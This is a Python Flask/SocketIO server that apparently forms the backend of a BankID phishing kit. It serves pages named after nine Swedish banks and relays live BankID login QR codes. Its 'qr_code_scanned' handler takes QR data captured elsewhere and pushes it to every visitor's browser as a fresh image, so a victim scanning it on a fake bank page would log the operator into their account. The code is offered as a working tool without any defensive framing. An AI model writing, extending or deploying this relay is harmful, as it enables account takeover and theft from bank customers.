from flask import Flask, render_template, request
from flask_socketio import SocketIO
import qrcode
import base64
from io import BytesIO
import hmac
import hashlib
import time
import uuid
import json

app = Flask(__name__)
socketio = SocketIO(app, cors_allowed_origins='*')

# Store QR tokens and secrets for the session
session_data = {}

@app.route('/')
def index():
    return render_template("index.html")


@app.route('/danske.html')
def danske():
    return render_template('danske.html')


@app.route('/handelsbanken.html')
def handelsbanken():
    return render_template('handelsbanken.html')


@app.route('/ica.html')
def ica():
    return render_template('ica.html')


@app.route('/lansforsakringar.html')
def lansforsakringar():
    return render_template('lansforsakringar.html')


@app.route('/nordea.html')
def nordea():
    return render_template('nordea.html')


@app.route('/seb.html')
def seb():
    return render_template('seb.html')


@app.route('/skandiabanken.html')
def skandiabanken():
    return render_template('skandiabanken.html')


@app.route('/sparbanken.html')
def sparbanken():
    return render_template('sparbanken.html')


@app.route('/swedbank.html')
def swedbank():
    return render_template('swedbank.html')


@app.route('/generate_bankid_qr', methods=['POST'])
def generate_bankid_qr():
    """Generate a new BankID QR code with token and secret"""
    # In a real implementation, you would call BankID API here
    # For demo purposes, we'll generate a UUID as token
    session_id = request.form.get('session_id', str(uuid.uuid4()))
    
    # Create new QR data if it doesn't exist
    if session_id not in session_data:
        # Generate qrStartToken and qrStartSecret as specified in BankID docs
        qr_start_token = str(uuid.uuid4())
        qr_start_secret = str(uuid.uuid4())
        order_time = time.time()
        
        session_data[session_id] = {
            'qr_start_token': qr_start_token,
            'qr_start_secret': qr_start_secret,
            'order_time': order_time,
            'created_at': time.time()
        }
    
    # Get the existing QR data
    qr_data = session_data[session_id]
    
    # Generate the animated QR code based on time elapsed
    qr_time = str(int(time.time() - qr_data['order_time']))
    
    # Compute qr_auth_code using HMAC-SHA256
    qr_auth_code = hmac.new(
        qr_data['qr_start_secret'].encode(), 
        qr_time.encode(), 
        hashlib.sha256
    ).hexdigest()
    
    # Format the QR data according to BankID specs
    bankid_qr_data = f"bankid.{qr_data['qr_start_token']}.{qr_time}.{qr_auth_code}"
    
    # Generate QR code image
    qr = qrcode.QRCode(
        version=1,
        error_correction=qrcode.constants.ERROR_CORRECT_L,
        box_size=10,
        border=4,
    )
    
    qr.add_data(bankid_qr_data)
    qr.make(fit=True)
    qr_img = qr.make_image(fill_color="black", back_color="white")
    
    buffered = BytesIO()
    qr_img.save(buffered, format="PNG")
    img_base64 = base64.b64encode(buffered.getvalue()).decode('utf-8')
    
    # Send the token (but not the secret) to the client for deep linking
    return json.dumps({
        'qr_image': img_base64, 
        'qr_code_data': bankid_qr_data,
        'autostarttoken': qr_data['qr_start_token'],
        'session_id': session_id
    })


@socketio.on('qr_code_scanned')
def handle_qr_code(data):
    qr_data = data['data']
    print(f"[Debug] QR code received: {qr_data}")
    
    # Store the last QR data globally for fresh requests
    global last_qr_data
    last_qr_data = qr_data
    
    qr = qrcode.QRCode(
        version=1,
        error_correction=qrcode.constants.ERROR_CORRECT_L,  
        box_size=10,
        border=4,
    )

    qr.add_data(qr_data)
    qr.make(fit=True)
    qr_img = qr.make_image(fill_color="black", back_color="white")

    buffered = BytesIO()
    qr_img.save(buffered, format="PNG")
    img_base64 = base64.b64encode(buffered.getvalue()).decode('utf-8')

    # Also send the QR data to the client for deep linking
    socketio.emit("update_qr_code_image", {
        'qr_image': img_base64, 
        'qr_code_data': qr_data,
        'qrData': qr_data  # For backward compatibility
    })


@socketio.on('request_qr_data')
def handle_request_qr_data():
    # This will generate a new BankID QR code
    session_id = str(uuid.uuid4())
    
    # Generate new QR data
    qr_start_token = str(uuid.uuid4())
    qr_start_secret = str(uuid.uuid4())
    order_time = time.time()
    
    session_data[session_id] = {
        'qr_start_token': qr_start_token,
        'qr_start_secret': qr_start_secret,
        'order_time': order_time,
        'created_at': time.time()
    }
    
    # Generate the QR code data
    qr_time = "0"  # Initial time is 0
    
    # Compute qr_auth_code using HMAC-SHA256
    qr_auth_code = hmac.new(
        qr_start_secret.encode(), 
        qr_time.encode(), 
        hashlib.sha256
    ).hexdigest()
    
    # Format the QR data according to BankID specs
    bankid_qr_data = f"bankid.{qr_start_token}.{qr_time}.{qr_auth_code}"
    
    # Generate and emit the QR code
    qr = qrcode.QRCode(
        version=1,
        error_correction=qrcode.constants.ERROR_CORRECT_L,
        box_size=10,
        border=4,
    )
    
    qr.add_data(bankid_qr_data)
    qr.make(fit=True)
    qr_img = qr.make_image(fill_color="black", back_color="white")
    
    buffered = BytesIO()
    qr_img.save(buffered, format="PNG")
    img_base64 = base64.b64encode(buffered.getvalue()).decode('utf-8')
    
    # Store the token as the last QR data for fresh requests
    global last_qr_data
    last_qr_data = qr_start_token
    
    # Send the QR image and token to the client
    socketio.emit("update_qr_code_image", {
        'qr_image': img_base64, 
        'qr_code_data': bankid_qr_data,
        'qrData': qr_start_token  # Send just the token for deep linking
    })
    
    # Also send the token via qr_data event for compatibility
    socketio.emit('qr_data', {'qrData': qr_start_token, 'session_id': session_id})


@socketio.on('request_fresh_qr_data')
def handle_fresh_qr_data_request():
    # Return the most recently scanned data or generate new data
    if 'last_qr_data' in globals():
        socketio.emit('qr_data', {'qrData': globals()['last_qr_data']})
    else:
        # Generate new QR data
        handle_request_qr_data()


# Clean up old session data periodically
@socketio.on('connect')
def handle_connect():
    # Clean up sessions older than 10 minutes
    current_time = time.time()
    expired_sessions = []
    
    for session_id, data in session_data.items():
        if current_time - data['created_at'] > 600:  # 10 minutes
            expired_sessions.append(session_id)
    
    for session_id in expired_sessions:
        del session_data[session_id]


# Start animated QR code updates
@socketio.on('start_qr_animation')
def handle_start_qr_animation(data):
    session_id = data.get('session_id')
    if not session_id or session_id not in session_data:
        # Generate new session if not provided or invalid
        return handle_request_qr_data()
    
    # Get the existing QR data
    qr_data = session_data[session_id]
    
    # Update the QR code with the current time
    qr_time = str(int(time.time() - qr_data['order_time']))
    
    # Compute qr_auth_code using HMAC-SHA256
    qr_auth_code = hmac.new(
        qr_data['qr_start_secret'].encode(), 
        qr_time.encode(), 
        hashlib.sha256
    ).hexdigest()
    
    # Format the QR data according to BankID specs
    bankid_qr_data = f"bankid.{qr_data['qr_start_token']}.{qr_time}.{qr_auth_code}"
    
    # Generate and emit the QR code
    qr = qrcode.QRCode(
        version=1,
        error_correction=qrcode.constants.ERROR_CORRECT_L,
        box_size=10,
        border=4,
    )
    
    qr.add_data(bankid_qr_data)
    qr.make(fit=True)
    qr_img = qr.make_image(fill_color="black", back_color="white")
    
    buffered = BytesIO()
    qr_img.save(buffered, format="PNG")
    img_base64 = base64.b64encode(buffered.getvalue()).decode('utf-8')
    
    # Send the QR image and token to the client
    socketio.emit("update_qr_code_image", {
        'qr_image': img_base64, 
        'qr_code_data': bankid_qr_data,
        'qrData': qr_data['qr_start_token']  # Send just the token for deep linking
    })


if __name__ == "__main__":
    # socketio.run(app, host='0.0.0.0', port=5000, debug=True)  
    socketio.run(app, host='0.0.0.0', port=5000, allow_unsafe_werkzeug=True)